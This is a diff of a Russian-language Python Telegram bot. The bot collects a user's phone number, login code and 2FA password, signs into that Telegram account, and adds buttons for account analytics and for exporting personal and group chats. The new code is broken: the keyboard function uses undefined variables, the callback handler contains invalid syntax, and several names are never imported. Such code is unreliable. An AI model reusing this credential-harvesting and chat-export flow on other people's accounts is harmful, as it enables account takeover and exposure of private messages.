@@ -11,6 +11,11 @@ from datetime import datetime
 from defunc import *
 import pytz
 from allowed_users import ALLOWED_USERS  # Импортируем словарь из отдельного файла
+from aiogram.types import InlineKeyboardMarkup as AiogramInlineKeyboardMarkup, \
+                          InlineKeyboardButton as AiogramInlineKeyboardButton, \
+                          CallbackQuery as AiogramCallbackQuery
+from aiogram.dispatcher import FSMContext
+
 
 
 # Загрузка переменных окружения из файла .env
@@ -67,7 +72,6 @@ async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
                 else:
                     await bot.send_message (chat_id, 'Файл {file_to_send} слишком большой и не будет отправлен. Обратитесь к администратору, чтобы его получить')
 
-
 # Обработчики сообщений
 @dp.message_handler(lambda message: message.from_user.id not in allowed_users)
 async def unauthorized(message: types.Message):
@@ -81,6 +85,58 @@ async def unauthorized(message: types.Message):
     user_info_message=f'Попытка запуска бота НЕАВТОРИЗОВАННЫМ пользователем ID:{user_id}.\nДата и время запуска: {now}'
     for admin_chat_id in admin_chat_ids:
             await bot.send_message(admin_chat_id, user_info_message)
+
+
+
+
+
+
+
+# Определение состояний
+class Form(StatesGroup):
+    awaiting_selection = State()
+
+# Функция для отображения клавиатуры
+async def show_keyboard():
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    buttons = [
+        InlineKeyboardButton(text="Сбор аналитики по аккаунту", callback_data='analitic'),
+        InlineKeyboardButton(text="Выгрузка личных чатов", callback_data='private'),
+        InlineKeyboardButton(text="Выгрузка групповых чатов", callback_data='group_chats')
+    ]
+    keyboard.add(*buttons)
+
+    await message.answer(user_id, "Выберите направление поиска", reply_markup=keyboard)
+    # Устанавливаем состояние "awaiting_selection"
+    await Form.awaiting_selection.set()
+
+
+# Обработчики колбэков для запуска нужных функций
+@dp.callback_query_handler(state=Form.awaiting_selection)
+async def handle_callback_query(callback_query: AiogramCallbackQuery, state: FSMContext):
+    code = callback_query.data
+    user_id = callback_query.from_user.id
+    await bot.answer_callback_query(callback_query.id)
+
+    if code == 'analitic':
+        await analitic_command(message: types.Message)
+    elif code == 'private':
+        await private_command(message: types.Message)
+    elif code == 'group_chats':
+        await export_group_chats(callback_query.message)
+    
+    # Сброс состояния
+    await state.finish()
+
+# Пример функции для выгрузки личных чатов
+async def export_personal_chats(message: AiogramMessage):
+    await message.answer("Выгрузка личных чатов...")
+
+# Пример функции для выгрузки групповых чатов
+async def export_group_chats(message: AiogramMessage):
+    await message.answer("Выгрузка групповых чатов...")
+
+
 
 
 # Добавляем обработчик команды /analitic
@@ -107,7 +163,7 @@ async def analitic_command(message: types.Message):
 
 # Добавляем обработчик команды /private
 @dp.message_handler(commands=['private'])
-async def analitic_command(message: types.Message):
+async def private_command(message: types.Message):
     user_id = message.from_user.id
     user_state[user_id]['get_private'] = True  # Обновляем состояние, будем использовать  в обработчике, чтобы словить ввод цифр
     if user_id in user_state and user_state[user_id].get('connected'):
@@ -229,6 +285,7 @@ async def get_code(message: types.Message):
         await client.connect()
         await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
         await message.answer("Подключено! Выбери в меню бота одну из опций")
+        await show_keyboard()
         user_state[user_id]['connected'] = True  # Обновляем состояние
         #await process_user_data(client, phone_number, message.from_user.id)
         #await client.log_out()
@@ -273,6 +330,7 @@ async def process_password(message: types.Message):
             await client.sign_in(password=password)
             user_state[user_id]['connected'] = True  # Обновляем состояние
             await message.answer("Подключено! Выбери в меню бота одну из опций")
+            await show_keyboard()
             phone_number = user_state[user_id]['phone_number']
             # await process_user_data(client, phone_number, user_id)
             # user_state.pop(user_id, None)  # Удаляем состояние пользователя после успешной обработки
